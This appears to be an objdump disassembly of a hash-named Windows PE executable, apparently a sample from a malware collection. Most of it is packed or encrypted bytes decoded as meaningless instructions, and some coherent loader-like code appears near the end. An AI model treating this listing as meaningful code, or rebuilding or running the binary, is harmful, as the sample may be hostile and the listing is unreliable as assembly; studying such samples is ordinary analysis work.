
6fc743ee8d8b70f5a19f97033cf87c0652bd3fccd73c8848c3e0b884133941f9.exe:     file format pei-i386


Disassembly of section .text:

004d0000 <.text>:
  4d0000:	test   eax,0xdcc9758a
  4d0005:	stc    
  4d0006:	xchg   edi,eax
  4d0007:	jg     0x4d0020
  4d0009:	cmp    al,0xe7
  4d000b:	nop
  4d000c:	aaa    
  4d000d:	add    DWORD PTR [eax],ecx
  4d000f:	imul   esi,DWORD PTR [eax-0x6f],0xffffffd4
  4d0013:	ret    
  4d0014:	sub    eax,0x24bab6b0
  4d0019:	test   al,0xd9
  4d001b:	aad    0x8
  4d001d:	and    DWORD PTR [edx-0x4bcc0315],ebp
  4d0023:	test   BYTE PTR [edx],0x50
  4d0026:	adc    dh,bh
  4d0028:	out    0xbd,eax
  4d002a:	out    dx,eax
  4d002b:	add    DWORD PTR [edx],ebx
  4d002d:	ret    0xf4a
  4d0030:	shl    BYTE PTR [ebx-0x759cdbdf],1
  4d0036:	inc    edx
  4d0037:	dec    eax
  4d0038:	or     dh,BYTE PTR [esi+0x15]
  4d003b:	or     BYTE PTR [eax-0x76],bh
  4d003e:	mov    ch,0x22
  4d0040:	jmp    0xb9dd:0xa2b449fa
  4d0047:	mov    ds,WORD PTR [ebx+0x66c1bea3]
  4d004d:	fadd   QWORD PTR [ebp+0x3e]
  4d0050:	adc    DWORD PTR [edi-0x5e],ecx
  4d0053:	mov    ah,0xf5
  4d0055:	mov    al,0x5d
  4d0057:	test   al,0x97
  4d0059:	inc    esp
  4d005a:	pop    esp
  4d005b:	push   0x44a3bb6a
  4d0060:	jg     0x4d0099
  4d0062:	pop    edi
  4d0063:	mov    ebx,0x40e75182
  4d0068:	popa   
  4d0069:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d006a:	and    DWORD PTR [edx],0x8
  4d006d:	popf   
  4d006e:	call   0x601868bc
  4d0073:	sbb    edi,edx
  4d0075:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d0076:	hlt    
  4d0077:	aaa    
  4d0078:	push   es
  4d0079:	mov    cl,0x13
  4d007b:	push   ecx
  4d007c:	add    DWORD PTR [ecx-0x46b9e914],edi
  4d0082:	js     0x4d00d2
  4d0084:	and    ecx,DWORD PTR [edi-0x3ab1ed14]
  4d008a:	data16 in al,dx
  4d008c:	or     BYTE PTR [ebx+0x22],al
  4d008f:	pop    edx
  4d0090:	std    
  4d0091:	aas    
  4d0092:	mov    ds:0xc6006ebe,al
  4d0097:	inc    ecx
  4d0098:	mov    ds:0x22639ff,eax
  4d009d:	pop    es
  4d009e:	(bad)  
  4d009f:	fldcw  WORD PTR [ecx-0x7]
  4d00a2:	cmp    BYTE PTR [eax+ebp*4-0x6f],bh
  4d00a6:	mov    edi,0x406ef889
  4d00ab:	jbe    0x4d0106
  4d00ad:	push   ds
  4d00ae:	jne    0x4d010a
  4d00b0:	mov    eax,ds:0x45f8ae1
  4d00b5:	and    eax,0x7ff0a075
  4d00ba:	dec    esi
  4d00bb:	dec    eax
  4d00bc:	call   0xd5d8:0xc4b7b185
  4d00c3:	jl     0x4d0126
  4d00c5:	jge    0x4d00d9
  4d00c7:	jge    0x4d006d
  4d00c9:	sub    ch,0x6a
  4d00cc:	xchg   esp,eax
  4d00cd:	adc    BYTE PTR [edx],0x95
  4d00d0:	clc    
  4d00d1:	jne    0x4d012b
  4d00d3:	imul   esi,DWORD PTR [ebx-0x76],0xffffffa6
  4d00d7:	or     dh,dl
  4d00d9:	int3   
  4d00da:	pop    eax
  4d00db:	dec    ebx
  4d00dc:	aaa    
  4d00dd:	mov    esi,0x42341cf4
  4d00e2:	pop    edi
  4d00e3:	cmp    ecx,esp
  4d00e5:	repnz les edx,FWORD PTR [esi+eax*4]
  4d00e9:	arpl   WORD PTR [edx-0x3a372f16],dx
  4d00ef:	ins    BYTE PTR es:[edi],dx
  4d00f0:	xor    BYTE PTR [ebp+0x75fa7b52],cl
  4d00f6:	lods   eax,DWORD PTR ds:[esi]
  4d00f7:	test   BYTE PTR [edx+0x73088ed0],dl
  4d00fd:	xor    eax,0xe0ceeed7
  4d0102:	sub    BYTE PTR [ecx],dh
  4d0104:	test   al,0x35
  4d0106:	adc    BYTE PTR [edi],ah
  4d0108:	lea    edi,[esi]
  4d010a:	add    DWORD PTR [esp+ecx*8-0xb],esp
  4d010e:	push   0xc70a9da0
  4d0113:	pop    edi
  4d0114:	fs hlt 
  4d0116:	test   eax,0xac0af0f0
  4d011b:	pop    ds
  4d011c:	pushf  
  4d011d:	jb     0x4d00df
  4d011f:	xor    BYTE PTR [ecx-0x64d9bc09],bh
  4d0125:	pop    es
  4d0126:	adc    ah,dh
  4d0128:	mov    edx,0x9a70f062
  4d012d:	repz call 0x6d46:0x5907f25e
  4d0135:	idiv   esp
  4d0137:	(bad)
  4d013a:	sar    DWORD PTR ds:0x3bbba85e,1
  4d0140:	mov    ebx,0x55e49be2
  4d0145:	aam    0xa5
  4d0147:	das    
  4d0148:	scas   eax,DWORD PTR es:[edi]
  4d0149:	and    ebp,DWORD PTR [edx-0x79]
  4d014c:	fwait
  4d014d:	loop   0x4d0144
  4d014f:	add    ebp,DWORD PTR [ebp-0x374370cf]
  4d0155:	paddb  mm1,QWORD PTR [edx-0x163b8abf]
  4d015c:	cli    
  4d015d:	jb     0x4d012c
  4d015f:	sbb    al,BYTE PTR [edi]
  4d0161:	lea    edi,[ebp+0x66ba85ad]
  4d0167:	cmp    dh,cl
  4d0169:	inc    edi
  4d016a:	cdq    
  4d016b:	lds    edx,FWORD PTR [ebx]
  4d016d:	das    
  4d016e:	jnp    0x4d01a9
  4d0170:	gs loope 0x4d0182
  4d0173:	inc    esi
  4d0174:	test   al,0x21
  4d0176:	jmp    0x4d018d
  4d0178:	test   eax,0xa83ce969
  4d017d:	out    0x6d,eax
  4d017f:	adc    al,0xab
  4d0181:	adc    BYTE PTR [esi-0x408352c4],0xcf
  4d0188:	lods   eax,DWORD PTR ds:[esi]
  4d0189:	mov    dh,0x0
  4d018b:	mov    BYTE PTR [edi-0xc],al
  4d018e:	pop    esi
  4d018f:	add    eax,DWORD PTR [ebp-0x2e03ba01]
  4d0195:	or     al,0x12
  4d0197:	gs mov bl,0xba
  4d019a:	push   ss
  4d019b:	jge    0x4d019c
  4d019d:	sub    eax,0xd20283f5
  4d01a2:	repnz std 
  4d01a4:	jmp    FWORD PTR ds:0xd26a5a0d
  4d01aa:	xor    ah,BYTE PTR [esi-0x3dbcd369]
  4d01b0:	rcr    BYTE PTR [esi-0x48],0xc9
  4d01b4:	xor    DWORD PTR [edx+0x75d03a52],ecx
  4d01ba:	adc    ebp,eax
  4d01bc:	mov    dx,0x3aee
  4d01c0:	fwait
  4d01c1:	popf   
  4d01c2:	pushf  
  4d01c3:	add    eax,0x6a3ed72
  4d01c8:	enter  0x746a,0x6d
  4d01cc:	cmp    eax,0xbb7d8c20
  4d01d1:	imul   eax,DWORD PTR [eax-0x4422b65a],0xffffffe4
  4d01d8:	sub    DWORD PTR [ebx+0x47],ecx
  4d01db:	adc    ah,BYTE PTR [ecx+0x2d]
  4d01de:	shl    DWORD PTR [esi+0x10],1
  4d01e1:	out    dx,eax
  4d01e2:	xchg   esp,eax
  4d01e3:	xor    BYTE PTR [edx],0x27
  4d01e6:	imul   ebx,DWORD PTR [edi+0x1f8e544],0xffffffd5
  4d01ed:	sbb    al,BYTE PTR [edi]
  4d01ef:	(bad)  
  4d01f0:	mov    bh,0x25
  4d01f2:	sub    DWORD PTR [ebx-0x352a1d3e],ecx
  4d01f8:	push   ebx
  4d01f9:	add    eax,0xfaae37a1
  4d01fe:	mov    ebx,0xb88eab91
  4d0203:	xchg   edx,eax
  4d0204:	jb     0x4d01d8
  4d0206:	xchg   edi,eax
  4d0207:	push   ebp
  4d0208:	int3   
  4d0209:	xor    DWORD PTR [eax-0x56],ebp
  4d020c:	lea    ecx,[edi+0x10]
  4d020f:	scas   al,BYTE PTR es:[edi]
  4d0210:	je     0x4d01c4
  4d0212:	out    dx,eax
  4d0213:	push   ecx
  4d0214:	add    bl,BYTE PTR [ebp-0x65]
  4d0217:	mov    dl,0x23
  4d0219:	push   0x69
  4d021b:	jno    0x4d01fb
  4d021d:	xchg   ebp,eax
  4d021e:	xchg   esi,eax
  4d021f:	mov    fs,WORD PTR [edx]
  4d0221:	fisttp WORD PTR [ebp+0x32542f75]
  4d0227:	dec    esi
  4d0228:	xor    dh,BYTE PTR [edi]
  4d022a:	shl    DWORD PTR [ebp+0xca0545],0x3c
  4d0231:	sti    
  4d0232:	xor    eax,0x3efb4aff
  4d0237:	je     0x4d01f3
  4d0239:	test   DWORD PTR [edx+ecx*1+0x53],0x186ab28d
  4d0241:	jbe    0x4d028b
  4d0243:	in     eax,dx
  4d0244:	call   0xd9e4be28
  4d0249:	xchg   ebp,eax
  4d024a:	dec    eax
  4d024b:	mov    edi,0x90b7c027
  4d0250:	xor    bl,cl
  4d0252:	mov    esi,0xcd27d47f
  4d0257:	jle    0x4d0233
  4d0259:	pop    ebp
  4d025a:	repz mul BYTE PTR [edx]
  4d025d:	into   
  4d025e:	add    edx,DWORD PTR [ebp-0x44b26f53]
  4d0264:	test   al,0xd9
  4d0266:	mov    dh,0x95
  4d0268:	mov    al,0x25
  4d026a:	lahf   
  4d026b:	jbe    0x4d0214
  4d026d:	gs addr16 push cs
  4d0270:	sbb    ch,BYTE PTR [ebx]
  4d0272:	sub    DWORD PTR [ebp+0x2d],edi
  4d0275:	in     eax,0x63
  4d0277:	mov    bh,0xd7
  4d0279:	jno    0x4d02c4
  4d027b:	into   
  4d027c:	jmp    0x2dfd:0x17dad202
  4d0283:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0284:	pop    edi
  4d0285:	pop    es
  4d0286:	pop    edi
  4d0287:	lahf   
  4d0288:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4d0289:	cli    
  4d028a:	lds    ebx,FWORD PTR [edi+0x5b]
  4d028d:	add    eax,0x6fa5f0ba
  4d0292:	push   0x23
  4d0294:	pop    ebx
  4d0295:	out    0x9d,al
  4d0297:	xchg   DWORD PTR [ecx-0x37293e06],edx
  4d029d:	pop    esi
  4d029e:	xchg   edx,eax
  4d029f:	jns    0x4d022b
  4d02a1:	clc    
  4d02a2:	ins    BYTE PTR es:[edi],dx
  4d02a3:	fadd   QWORD PTR [ebx-0x6d15e9a1]
  4d02a9:	mov    edi,DWORD PTR [ecx+0x77]
  4d02ac:	xor    dl,ch
  4d02ae:	adc    DWORD PTR [edx+ebx*2+0x1d],ebx
  4d02b2:	repnz sbb ebx,esp
  4d02b5:	or     eax,0xc4a31a64
  4d02ba:	stos   DWORD PTR es:[edi],eax
  4d02bb:	imul   esi,ebx,0x9996543b
  4d02c1:	push   edx
  4d02c2:	push   eax
  4d02c3:	push   0x68
  4d02c5:	lods   eax,DWORD PTR ds:[esi]
  4d02c6:	cmp    cl,BYTE PTR [ecx+edi*1+0x53]
  4d02ca:	lds    esi,FWORD PTR [ebx-0x2fb55cb3]
  4d02d0:	xor    eax,0xcf2fb55d
  4d02d5:	xchg   ebp,eax
  4d02d6:	clc    
  4d02d7:	pop    ebx
  4d02d8:	sub    ch,BYTE PTR [esi+0x2]
  4d02db:	cmc    
  4d02dc:	bound  edx,QWORD PTR [esi+0x4e]
  4d02df:	pop    esp
  4d02e0:	icebp  
  4d02e1:	stc    
  4d02e2:	sbb    ebp,DWORD PTR [eax+0x57f40678]
  4d02e8:	mov    DWORD PTR [eax-0x71],edx
  4d02eb:	nop
  4d02ec:	jl     0x4d02ed
  4d02ee:	fidiv  DWORD PTR [ebx-0x13]
  4d02f1:	add    BYTE PTR ds:0x4c56148c,dh
  4d02f7:	js     0x4d030a
  4d02f9:	stos   BYTE PTR es:[edi],al
  4d02fa:	ret    
  4d02fb:	xchg   eax,esi
  4d02fd:	push   esp
  4d02fe:	xchg   edx,eax
  4d02ff:	test   BYTE PTR [eax],dl
  4d0301:	add    DWORD PTR [edx-0x2b],edi
  4d0304:	dec    edx
  4d0305:	lods   al,BYTE PTR ds:[esi]
  4d0306:	mov    cl,0xf2
  4d0308:	or     bh,bl
  4d030a:	push   ss
  4d030b:	(bad)  
  4d030d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4d030e:	shl    BYTE PTR ds:0x87941b52,cl
  4d0314:	adc    eax,0x60a86c8e
  4d0319:	jp     0x4d02d3
  4d031b:	push   esi
  4d031c:	mov    al,0x85
  4d031e:	inc    edi
  4d031f:	stos   BYTE PTR es:[edi],al
  4d0320:	sbb    DWORD PTR gs:[edx-0x55f40abc],0xa84510df
  4d032b:	jo     0x4d031d
  4d032d:	jmp    0x4d02ee
  4d032f:	(bad)  
  4d0330:	and    DWORD PTR [eax+eax*2],edx
  4d0333:	(bad)  
  4d0334:	arpl   sp,dx
  4d0336:	les    ecx,FWORD PTR [eax+0x77a35c9d]
  4d033c:	je     0x4d02e1
  4d033e:	pop    esp
  4d033f:	fisttp WORD PTR [esi]
  4d0341:	popa   
  4d0342:	(bad)  
  4d0343:	and    BYTE PTR [ebx],al
  4d0345:	lahf   
  4d0346:	cmp    dh,bl
  4d0348:	push   ebx
  4d0349:	ins    DWORD PTR es:[edi],dx
  4d034a:	(bad)  
  4d034b:	ja     0x4d0307
  4d034d:	in     al,dx
  4d034e:	xchg   edx,eax
  4d034f:	loopne 0x4d02f0
  4d0351:	cwde   
  4d0352:	ss xchg ebp,eax
  4d0354:	jecxz  0x4d031e
  4d0356:	mov    ebx,cs
  4d0358:	or     DWORD PTR [edi],edi
  4d035a:	and    BYTE PTR [edi],dl
  4d035c:	cmc    
  4d035d:	dec    esi
  4d035e:	adc    al,0xec
  4d0360:	iret   
  4d0361:	cmp    al,0xd4
  4d0363:	lahf   
  4d0364:	and    eax,0xdc603c7d
  4d0369:	sub    BYTE PTR [ebx+0x547d248b],0x2e
  4d0370:	cld    
  4d0371:	sub    BYTE PTR [ebx+0x545eedd1],0x2e
  4d0378:	adc    edi,eax
  4d037a:	fs fldz 
  4d037d:	pop    es
  4d037e:	fwait
  4d037f:	push   cs
  4d0380:	jmp    0xa43e687c
  4d0385:	fsub   DWORD PTR [esi]
  4d0387:	inc    ebx
  4d0388:	and    al,0xe2
  4d038b:	mov    esp,0xb051f7f
  4d0390:	and    eax,0xab7e80fa
  4d0396:	iret   
  4d0397:	addr16 inc ecx
  4d0399:	push   esp
  4d039a:	xor    BYTE PTR [eax+0x29206bf3],bl
  4d03a0:	(bad)  
  4d03a1:	fwait
  4d03a2:	mov    al,ds:0x60714fdb
  4d03a7:	sub    dh,dl
  4d03a9:	cmp    ah,BYTE PTR [eax+ebx*4]
  4d03ac:	mov    al,ds:0x58f334b6
  4d03b1:	test   DWORD PTR [eax-0x1b3b537f],edx
  4d03b7:	pop    ebx
  4d03b8:	loopne 0x4d0429
  4d03ba:	aas    
  4d03bb:	pop    ebp
  4d03bc:	sub    edx,DWORD PTR [eax+0x5bea2c0]
  4d03c2:	aas    
  4d03c3:	pop    ebp
  4d03c4:	inc    edx
  4d03c5:	or     bh,BYTE PTR [eax-0x51]
  4d03c8:	adc    eax,0xf409d954
  4d03cd:	stos   DWORD PTR es:[edi],eax
  4d03ce:	es div ch
  4d03d1:	(bad)  
  4d03d3:	or     DWORD PTR [ebx],ecx
  4d03d5:	or     BYTE PTR [edi],0x76
  4d03d8:	cmc    
  4d03d9:	jg     0x4d03cb
  4d03db:	adc    eax,DWORD PTR [eax+0x444d2ba4]
  4d03e1:	lods   eax,DWORD PTR ds:[esi]
  4d03e2:	xchg   ebp,eax
  4d03e3:	fimul  DWORD PTR [ebx]
  4d03e6:	mov    esp,DWORD PTR [edi+eiz*1-0xc]
  4d03ea:	mov    esp,0x45c50a0f
  4d03ef:	lock idiv DWORD PTR [edx]
  4d03f2:	add    al,BYTE PTR [edx+esi*1-0x3083e182]
  4d03f9:	sub    DWORD PTR [ecx],0xdb3752f8
  4d03ff:	pop    es
  4d0400:	scas   eax,DWORD PTR es:[edi]
  4d0401:	enter  0x6c6c,0x6a
  4d0405:	lock rcl DWORD PTR [ebx-0x1f8bf069],cl
  4d040c:	jp     0x4d03b7
  4d040e:	nop
  4d040f:	pop    ds
  4d0410:	xchg   DWORD PTR [esi-0x49],edx
  4d0413:	push   esp
  4d0414:	and    BYTE PTR [edx-0x77],0xab
  4d0418:	jg     0x4d03b7
  4d041a:	mov    esi,0x2ed82c8
  4d041f:	xchg   ecx,eax
  4d0420:	inc    edx
  4d0421:	jae    0x4d03ab
  4d0423:	les    ebp,FWORD PTR [edi]
  4d0425:	push   cs
  4d0426:	push   0xffffffcd
  4d0428:	mov    esp,0x92be0e37
  4d042d:	xor    BYTE PTR [ebp+0x40],bh
  4d0430:	repnz dec esp
  4d0432:	fstp   TBYTE PTR [edi-0x4ada497d]
  4d0438:	(bad)  
  4d0439:	aam    0x1f
  4d043b:	stos   DWORD PTR es:[edi],eax
  4d043c:	mov    al,0xeb
  4d043e:	push   esp
  4d043f:	push   0xffffffda
  4d0441:	pop    edx
  4d0442:	out    0xe7,eax
  4d0444:	loope  0x4d03ef
  4d0446:	sbb    BYTE PTR [eax],bl
  4d0448:	and    BYTE PTR [esi],bh
  4d044a:	(bad)  
  4d044b:	jmp    0x1a19c631
  4d0450:	adc    BYTE PTR [edx+0x2b],al
  4d0453:	adc    bh,BYTE PTR [ecx-0x42b9b607]
  4d0459:	adc    edi,DWORD PTR [ecx-0x3c105fd2]
  4d045f:	sub    eax,0x57985d8c
  4d0464:	ds pop ss
  4d0466:	jae    0x4d04bd
  4d0468:	adc    ebx,DWORD PTR [edi+ecx*2]
  4d046b:	add    eax,0xfe9a6799
  4d0470:	dec    edx
  4d0471:	jl     0x4d043a
  4d0473:	les    edx,FWORD PTR [edi]
  4d0475:	pop    es
  4d0476:	mov    dh,0x87
  4d0478:	jmp    0xa393:0x26605c6c
  4d047f:	lahf   
  4d0480:	jmp    0x8a9a:0xe5b0
  4d0486:	push   ebp
  4d0487:	lds    ecx,FWORD PTR [edi+0x19]
  4d048a:	stos   DWORD PTR es:[edi],eax
  4d048b:	cmp    dh,BYTE PTR [edx+0x4e261847]
  4d0491:	push   cs
  4d0492:	and    al,0x65
  4d0494:	mov    edi,DWORD PTR [ebp+0x51]
  4d0497:	out    0x1,eax
  4d0499:	enter  0x68fe,0x50
  4d049d:	mov    al,ds:0x5fbd9701
  4d04a2:	push   ecx
  4d04a3:	push   0xe807e099
  4d04a8:	repz pop ss
  4d04aa:	in     al,dx
  4d04ab:	mov    esp,0x431420f6
  4d04b0:	or     esp,DWORD PTR [edi]
  4d04b2:	jne    0x4d04b5
  4d04b4:	sbb    bh,cl
  4d04b6:	adc    eax,0xa71374f7
  4d04bb:	or     eax,0x5658ec8d
  4d04c0:	adc    eax,0xeca9a72c
  4d04c5:	pop    esi
  4d04c6:	leave  
  4d04c7:	and    BYTE PTR [esi+0x9],0x37
  4d04cb:	jge    0x4d0474
  4d04cd:	neg    BYTE PTR [ebx]
  4d04cf:	sub    BYTE PTR [edi+0xa8a7149],0x46
  4d04d6:	nop
  4d04d7:	lds    eax,FWORD PTR [edx+0x7232fb89]
  4d04dd:	sbb    al,0x69
  4d04df:	outs   dx,BYTE PTR ds:[esi]
  4d04e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4d04e1:	jecxz  0x4d0479
  4d04e3:	xchg   ecx,eax
  4d04e4:	jmp    0xdc1c9a45
  4d04e9:	add    ebp,esp
  4d04eb:	sbb    al,0x46
  4d04ed:	(bad)  
  4d04ee:	adc    esp,ebx
  4d04f0:	and    esp,DWORD PTR [esi]
  4d04f2:	out    dx,al
  4d04f3:	sbb    al,0xde
  4d04f5:	or     al,0x8
  4d04f7:	dec    esi
  4d04f8:	and    ebx,DWORD PTR [ebp+0x0]
  4d04fb:	mov    cl,0x33
  4d04fd:	mov    edi,0x9422278a
  4d0502:	je     0x4d0532
  4d0504:	adc    esi,edi
  4d0506:	iret   
  4d0507:	cmc    
  4d0508:	or     cl,BYTE PTR [eax+esi*2]
  4d050b:	inc    esi
  4d050c:	xor    BYTE PTR [eax+edx*2-0x46],0x7f
  4d0511:	mov    esi,DWORD PTR [esi+eax*1]
  4d0514:	div    BYTE PTR [ebp+0x11]
  4d0517:	dec    esi
  4d0518:	pop    esi
  4d0519:	mov    DWORD PTR [edx+ebp*8+0x28],eax
  4d051d:	aaa    
  4d051e:	xor    ebx,edi
  4d0520:	sub    al,0xc8
  4d0522:	and    al,0x1d
  4d0524:	push   esi
  4d0525:	cld    
  4d0526:	jmp    esp
  4d0528:	stos   DWORD PTR es:[edi],eax
  4d0529:	add    ecx,DWORD PTR [ecx-0x27e78571]
  4d052f:	xor    esp,edi
  4d0531:	dec    edi
  4d0532:	xchg   esp,eax
  4d0533:	cmp    BYTE PTR [edx],bl
  4d0535:	mov    al,0xd3
  4d0537:	cmp    DWORD PTR [ebx+0x7e],ebx
  4d053a:	nop
  4d053b:	cs adc esi,ebp
  4d053e:	in     eax,0x34
  4d0540:	inc    edx
  4d0541:	or     dh,BYTE PTR [eax-0x31]
  4d0544:	inc    esp
  4d0545:	mov    dh,0x5
  4d0547:	cmp    DWORD PTR [ecx],edx
  4d0549:	dec    ecx
  4d054a:	push   eax
  4d054b:	(bad)  
  4d054c:	jne    0x4d05c5
  4d054e:	and    al,0x86
  4d0550:	test   BYTE PTR [eax-0x14861cbd],0x22
  4d0557:	test   esi,ebp
  4d0559:	mov    ecx,DWORD PTR [ebp-0x13]
  4d055c:	les    esi,FWORD PTR [bx+di-0x5d98]
  4d0561:	mov    esi,0x31eaa412
  4d0566:	ds mov al,0x81
  4d0569:	push   cs
  4d056a:	sub    al,0x57
  4d056c:	(bad)  
  4d056d:	lock sub DWORD PTR [ebp-0x64d5a07d],esi
  4d0574:	call   0x3f9a3120
  4d0579:	pop    eax
  4d057a:	aam    0xb2
  4d057c:	dec    ebp
  4d057d:	in     al,0x4f
  4d057f:	into   
  4d0580:	jnp    0x4d05b0
  4d0582:	mov    al,0x31
  4d0584:	xchg   BYTE PTR [ebx],bh
  4d0586:	push   edi
  4d0587:	daa    
  4d0588:	outs   dx,BYTE PTR ds:[esi]
  4d0589:	imul   esi,eax,0x9d425963
  4d058f:	sbb    ah,BYTE PTR [ecx-0x47703492]
  4d0595:	cmp    al,0xe5
  4d0597:	xor    esi,ebx
  4d0599:	ret    0xd870
  4d059c:	data16 rcl BYTE PTR [ebx+0x34],0xfc
  4d05a1:	add    al,BYTE PTR ds:0xe352d5cb
  4d05a7:	shr    DWORD PTR [ebp*4-0x679d76e4],cl
  4d05ae:	push   ebx
  4d05af:	cli    
  4d05b0:	pop    edi
  4d05b1:	ins    BYTE PTR es:[edi],dx
  4d05b2:	xor    eax,0x27a3c64a
  4d05b7:	mov    dh,0x3b
  4d05b9:	pop    esp
  4d05ba:	fmul   DWORD PTR [ecx-0x3a]
  4d05bd:	mov    ds:0x5c3bb68f,eax
  4d05c2:	jo     0x4d05d0
  4d05c4:	sub    al,0xd7
  4d05c6:	test   DWORD PTR [edx-0x71],ebx
  4d05c9:	jbe    0x4d059f
  4d05cb:	or     ebx,DWORD PTR [edi]
  4d05cd:	lock pop esi
  4d05cf:	les    edx,FWORD PTR [esi+0x18]
  4d05d2:	and    ch,BYTE PTR [edx]
  4d05d4:	lods   eax,DWORD PTR ds:[esi]
  4d05d5:	neg    ebp
  4d05d7:	aad    0x3f
  4d05d9:	imul   BYTE PTR [edi+0x4f8ec088]
  4d05df:	in     eax,dx
  4d05e0:	xor    bh,ch
  4d05e2:	es dec ebp
  4d05e4:	xor    eax,0x59f829bd
  4d05e9:	ja     0x4d05df
  4d05eb:	ins    DWORD PTR es:[edi],dx
  4d05ec:	push   ebp
  4d05ed:	out    dx,eax
  4d05ee:	bound  esp,QWORD PTR ds:[ecx]
  4d05f1:	icebp  
  4d05f2:	test   bh,ch
  4d05f4:	adc    ebx,eax
  4d05f6:	mov    esp,0x47a0b03b
  4d05fb:	cmp    BYTE PTR [ebx+0x4a],dl
  4d05fe:	mov    al,0xfb
  4d0600:	outs   dx,BYTE PTR ds:[esi]
  4d0601:	mov    ecx,0xa08fe711
  4d0606:	mov    cl,0xa4
  4d0608:	out    dx,eax
  4d0609:	(bad)  
  4d060a:	mov    eax,0x57387a5f
  4d060f:	mov    al,ds:0x60131e87
  4d0614:	jns    0x4d064d
  4d0616:	std    
  4d0617:	sub    bh,BYTE PTR [eax+0x4a]
  4d061a:	out    dx,eax
  4d061b:	(bad)  [edx+0x73b110b5]
  4d0621:	mov    bl,0xf3
  4d0623:	dec    edi
  4d0624:	mov    cs,WORD PTR [ebx+eiz*2+0x3]
  4d0628:	jb     0x4d0633
  4d062a:	mov    ebp,0xc35e8f66
  4d062f:	cdq    
  4d0630:	jb     0x4d05d3
  4d0632:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4d0633:	imul   edi,ecx,0x7097c35e
  4d0639:	mov    eax,ds:0xb611683c
  4d063e:	ret    0x14ed
  4d0641:	retf   
  4d0642:	add    DWORD PTR [edi],edx
  4d0644:	out    dx,al
  4d0645:	xor    al,0xfe
  4d0647:	stos   DWORD PTR es:[edi],eax
  4d0648:	mov    ds:0x59250123,eax
  4d064d:	mov    cl,0xa1
  4d064f:	cmp    al,0x32
  4d0651:	mov    esp,DWORD PTR [edx+0x10]
  4d0654:	sbb    al,0x2d
  4d0656:	dec    ebp
  4d0657:	mov    esp,0xca4c0ec2
  4d065c:	pop    edi
  4d065d:	jge    0x4d065b
  4d065f:	xchg   edi,eax
  4d0660:	xor    ebp,0xffffffdc
  4d0663:	sbb    DWORD PTR [esi-0x39],0x1
  4d0667:	jmp    0xebe7edaa
  4d066c:	cmp    DWORD PTR [esi+ebp*4],0xffffffb0
  4d0670:	push   esi
  4d0671:	xor    edi,edi
  4d0673:	test   ax,0xab98
  4d0677:	push   ds
  4d0678:	sahf   
  4d0679:	shr    esi,cl
  4d067b:	or     ch,BYTE PTR [ebx-0x51]
  4d067e:	sbb    al,0x9c
  4d0680:	dec    edi
  4d0681:	aaa    
  4d0682:	cli    
  4d0683:	fs repnz in al,0x6
  4d0687:	es retf 0xdb63
  4d068b:	mov    eax,ds:0x84815bc4
  4d0690:	aas    
  4d0691:	aaa    
  4d0692:	mov    esi,0x41c8c232
  4d0697:	int    0x3f
  4d0699:	aaa    
  4d069a:	mov    esi,0x41c8c232
  4d069f:	int    0x3f
  4d06a1:	aaa    
  4d06a2:	mov    esi,0x41c8c232
  4d06a7:	int    0x3f
  4d06a9:	aaa    
  4d06aa:	mov    esi,0x41c8c232
  4d06af:	int    0x3f
  4d06b1:	cwde   
  4d06b2:	mov    esi,0x46bfc232
  4d06b7:	int    0x3f
  4d06b9:	inc    esp
  4d06ba:	mov    ecx,0xe2fe7732
  4d06bf:	jp     0x4d0729
  4d06c1:	aas    
  4d06c2:	pop    ebx
  4d06c3:	test   BYTE PTR ds:0xd59aab93,cl
  4d06c9:	and    BYTE PTR [ecx-0x46],0x7b
  4d06cd:	sbb    DWORD PTR [ebx+0x6e],esp
  4d06d0:	cmp    ah,BYTE PTR [edx-0x54]
  4d06d3:	loop   0x4d065d
  4d06d5:	xchg   ebp,eax
  4d06d6:	push   edi
  4d06d7:	sbb    BYTE PTR [eax],dl
  4d06d9:	cmp    dh,bl
  4d06db:	pop    ds
  4d06dc:	xchg   esi,eax
  4d06dd:	jns    0x4d0663
  4d06df:	or     ebx,eax
  4d06e1:	loopne 0x4d0700
  4d06e3:	scas   eax,DWORD PTR es:[edi]
  4d06e4:	into   
  4d06e5:	add    BYTE PTR [ebx],0xf4
  4d06e8:	sub    DWORD PTR [ecx-0xa04589],0x4d206815
  4d06f2:	add    bh,bh
  4d06f4:	xlat   BYTE PTR ds:[ebx]
  4d06f5:	add    BYTE PTR [eax],al
  4d06f7:	add    BYTE PTR [edi-0x1],bl
  4d06fa:	adc    eax,0x4d2038
  4d06ff:	call   edi
  4d0701:	add    BYTE PTR [eax],al
  4d0703:	add    BYTE PTR [edi-0x1],bl
  4d0706:	adc    eax,0x4d2084
  4d070b:	call   edi
  4d070d:	add    BYTE PTR [eax],al
  4d070f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0715:	sub    esp,0x38
  4d0718:	lea    edi,ds:0x4d317c
  4d071e:	cmp    edi,0x7d9
  4d0724:	jb     0x4d0713
  4d0726:	push   edi
  4d0727:	mov    edi,0x0
  4d072c:	push   edi
  4d072d:	call   0x4d14c4
  4d0732:	add    esp,0x4
  4d0735:	pop    edi
  4d0736:	push   edi
  4d0737:	push   eax
  4d0738:	push   DWORD PTR [edi+0x1e0]
  4d073e:	push   eax
  4d073f:	call   0x4d0d6c
  4d0744:	add    esp,0xc
  4d0747:	pop    edi
  4d0748:	push   edi
  4d0749:	push   0x0
  4d074b:	call   0x4d1240
  4d0750:	add    esp,0x4
  4d0753:	pop    edi
  4d0754:	add    esp,0x38
  4d0757:	pop    ebp
  4d0758:	ret    
  4d0759:	add    BYTE PTR [eax],al
  4d075b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0761:	sub    esp,0x20
  4d0764:	mov    edx,0x4d3174
  4d0769:	sbb    DWORD PTR [ebp-0x14],eax
  4d076c:	push   edx
  4d076d:	call   0x4d0a44
  4d0772:	add    esp,0x4
  4d0775:	pop    edx
  4d0776:	push   edx
  4d0777:	push   ecx
  4d0778:	push   eax
  4d0779:	push   DWORD PTR [edx+0xf0]
  4d077f:	push   DWORD PTR [edx+0x144]
  4d0785:	call   0x4d0a94
  4d078a:	add    esp,0x10
  4d078d:	pop    edx
  4d078e:	mov    ecx,0x4d2010
